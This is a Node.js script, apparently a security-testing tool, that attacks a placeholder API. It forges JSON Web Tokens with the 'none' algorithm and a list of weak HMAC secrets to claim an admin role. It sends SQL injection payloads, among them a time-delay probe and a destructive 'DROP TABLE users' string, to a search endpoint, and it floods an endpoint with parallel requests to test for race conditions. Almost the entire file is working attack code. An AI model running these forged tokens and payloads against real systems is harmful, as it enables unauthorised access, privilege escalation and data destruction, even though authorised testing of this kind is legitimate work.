/**
 * Advanced Vulnerability Tester
 * 
 * JWT Manipulation, SQL Injection, Race Conditions
 * 
 * Usage: node test_api_advanced.js
 */

const crypto = require('crypto');

// ============ CẤU HÌNH ============
const TARGET_URL = 'https://TARGET_API_DOMAIN/api';
const TOKEN = 'YOUR_JWT_TOKEN_HERE';
// ==================================

const results = [];

function log(icon, msg) {
    console.log(`${icon} ${msg}`);
    results.push(msg);
}

// ── JWT Manipulation ────

function forgeJWT_None(payload) {
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
    const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
    return `${header}.${body}.`;
}

function forgeJWT_WeakSecret(payload, secret) {
    const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
    const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
    const sig = crypto.createHmac('sha256', secret).update(`${header}.${body}`).digest('base64url');
    return `${header}.${body}.${sig}`;
}

async function testJWT() {
    log('🔑', '── JWT Attacks ──\n');
    
    const payload = {
        user_id: '00000000-0000-0000-0000-000000000000',
        role: 'admin',
        exp: Math.floor(Date.now() / 1000) + 3600,
    };

    // None algorithm variants
    const noneVariants = ['none', 'None', 'NONE', 'nOnE'];
    for (const alg of noneVariants) {
        const token = forgeJWT_None({ ...payload, alg });
        const res = await fetch(`${TARGET_URL}/user`, {
            headers: { 'Authorization': `Bearer ${token}` },
            signal: AbortSignal.timeout(10000),
        }).catch(() => null);
        log(res?.status === 200 ? '🔴' : '✅', `JWT none (${alg}): ${res?.status || 'error'}`);
    }

    // Weak secrets
    const weakSecrets = [
        'secret', 'password', '123456', 'admin', 'key',
        'jwt_secret', 'changeme', 'test', 'development',
    ];
    for (const secret of weakSecrets) {
        const token = forgeJWT_WeakSecret(payload, secret);
        const res = await fetch(`${TARGET_URL}/user`, {
            headers: { 'Authorization': `Bearer ${token}` },
            signal: AbortSignal.timeout(10000),
        }).catch(() => null);
        log(res?.status === 200 ? '🔴' : '✅', `JWT secret "${secret}": ${res?.status || 'error'}`);
    }
}

// ── SQL Injection ────

async function testSQLi() {
    log('💉', '\n── SQL Injection ──\n');
    
    const payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT 1,2,3--",
        "1' AND SLEEP(3)--",
        "1; DROP TABLE users--",
    ];

    for (const payload of payloads) {
        const res = await fetch(`${TARGET_URL}/search?q=${encodeURIComponent(payload)}`, {
            headers: { 'Authorization': `Bearer ${TOKEN}` },
            signal: AbortSignal.timeout(10000),
        }).catch(() => null);
        log(res?.status === 200 ? '⚠️' : '✅', `SQLi "${payload.substring(0, 30)}": ${res?.status || 'error'}`);
    }
}

// ── Race Condition ────

async function testRaceCondition() {
    log('🏎️', '\n── Race Conditions ──\n');
    
    const promises = Array.from({ length: 10 }, () =>
        fetch(`${TARGET_URL}/notifications/read-all`, {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${TOKEN}`, 'Content-Type': 'application/json' },
            signal: AbortSignal.timeout(10000),
        }).then(r => r.status).catch(() => 'error')
    );

    const statuses = await Promise.all(promises);
    log('📊', `Race condition results: ${JSON.stringify(statuses)}`);
}

async function main() {
    console.log('═'.repeat(60));
    console.log('  ADVANCED VULNERABILITY TESTER');
    console.log('═'.repeat(60) + '\n');

    await testJWT();
    await testSQLi();
    await testRaceCondition();

    console.log('\n' + '═'.repeat(60));
    console.log(`  DONE — ${results.length} tests`);
    console.log('═'.repeat(60));

    const fs = require('fs');
    fs.writeFileSync('advanced_test_results.json', JSON.stringify(results, null, 2));
}

main().catch(console.error);
